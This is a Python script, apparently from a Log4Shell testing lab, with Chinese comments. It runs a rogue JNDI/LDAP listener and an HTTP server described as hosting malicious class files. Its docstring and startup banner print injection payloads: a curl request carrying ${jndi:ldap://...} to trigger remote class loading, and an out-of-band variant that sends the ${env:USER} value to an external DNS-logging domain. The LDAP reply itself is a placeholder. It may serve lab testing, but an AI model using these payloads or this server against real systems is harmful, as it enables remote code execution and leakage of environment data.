#!/usr/bin/env python3
"""
简易 JNDI/LDAP 服务器用于 Log4Shell RCE 测试
使用 rogue-jndi 或类似工具的简化版本

使用方法:
    python3 jndi_server.py

然后测试:
    curl "http://localhost:8080/log4j/vuln?token=\${jndi:ldap://127.0.0.1:1389/Exploit}"
"""

import socket
import threading
import time
import sys
from datetime import datetime

class JNDIServer:
    def __init__(self, host='0.0.0.0', port=1389):
        self.host = host
        self.port = port
        self.running = False
        self.requests = []

    def handle_ldap(self, client_socket, address):
        """处理 LDAP 连接"""
        try:
            data = client_socket.recv(1024)
            if data:
                request_info = {
                    'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    'client': address[0],
                    'data': data.hex()[:100]
                }
                self.requests.append(request_info)

                print(f"\033[0;32m[+]\033[0m JNDI 请求来自: {address[0]}:{address[1]}")
                print(f"    时间: {request_info['time']}")
                print(f"    数据: {request_info['data']}...")

                # 发送 LDAP 响应 (简化版)
                # 实际攻击需要发送恶意 class 文件
                response = bytes.fromhex(
                    "3082010d020101610b06092a864886f70d010101040361646d696e"
                )
                client_socket.send(response)
        except Exception as e:
            print(f"[-] 处理错误: {e}")
        finally:
            client_socket.close()

    def start(self):
        """启动 LDAP 服务器"""
        self.running = True
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind((self.host, self.port))
        server_socket.listen(5)

        print(f"""
╔════════════════════════════════════════════════════════════╗
║           JNDI/LDAP Server for Log4Shell Testing          ║
╠════════════════════════════════════════════════════════════╣
║  监听地址: {self.host}:{self.port}                            ║
║  启动时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}           ║
╠════════════════════════════════════════════════════════════╣
║  测试命令:                                                  ║
║  curl "http://localhost:8080/log4j/vuln?token=\\            ║
║    \\${{jndi:ldap://127.0.0.1:1389/Exploit}}"               ║
║                                                            ║
║  测试 DNS 外带:                                             ║
║  curl "http://localhost:8080/log4j/vuln?token=\\            ║
║    \\${{jndi:ldap://\\${{env:USER}}.your.dns.log.cn/exp}}" ║
╚════════════════════════════════════════════════════════════╝
        """)

        try:
            while self.running:
                try:
                    server_socket.settimeout(1.0)
                    client_socket, address = server_socket.accept()
                    thread = threading.Thread(
                        target=self.handle_ldap,
                        args=(client_socket, address)
                    )
                    thread.daemon = True
                    thread.start()
                except socket.timeout:
                    continue
                except KeyboardInterrupt:
                    break
        finally:
            server_socket.close()
            self.print_summary()

    def print_summary(self):
        """打印请求摘要"""
        print("\n" + "="*60)
        print("JNDI 请求摘要")
        print("="*60)
        if self.requests:
            for i, req in enumerate(self.requests, 1):
                print(f"\n[{i}] {req['time']}")
                print(f"    客户端: {req['client']}")
        else:
            print("未收到任何 JNDI 请求")
            print("\n可能原因:")
            print("  1. Log4j 版本已修复 (非 2.14.1)")
            print("  2. 网络连接问题")
            print("  3. Payload 格式错误")

class HTTPServer:
    """简单的 HTTP 服务器用于托管恶意 class 文件"""

    def __init__(self, host='0.0.0.0', port=8888):
        self.host = host
        self.port = port

    def start(self):
        """启动 HTTP 服务器"""
        import http.server
        import socketserver

        handler = http.server.SimpleHTTPRequestHandler
        with socketserver.TCPServer((self.host, self.port), handler) as httpd:
            print(f"\n[+] HTTP 服务器启动在 {self.host}:{self.port}")
            print("    用于托管恶意 class 文件")
            try:
                httpd.serve_forever()
            except KeyboardInterrupt:
                print("\n[!] HTTP 服务器停止")

if __name__ == '__main__':
    import argparse

    parser = argparse.ArgumentParser(description='JNDI 服务器用于 Log4Shell 测试')
    parser.add_argument('--host', default='0.0.0.0', help='监听地址')
    parser.add_argument('--port', type=int, default=1389, help='LDAP 端口')
    parser.add_argument('--http-port', type=int, default=8888, help='HTTP 端口')
    parser.add_argument('--http-only', action='store_true', help='只启动 HTTP 服务器')

    args = parser.parse_args()

    if args.http_only:
        http = HTTPServer(args.host, args.http_port)
        http.start()
    else:
        # 在后台启动 HTTP 服务器
        http = HTTPServer(args.host, args.http_port)
        http_thread = threading.Thread(target=http.start, daemon=True)
        http_thread.start()

        # 启动 LDAP 服务器
        server = JNDIServer(args.host, args.port)
        server.start()
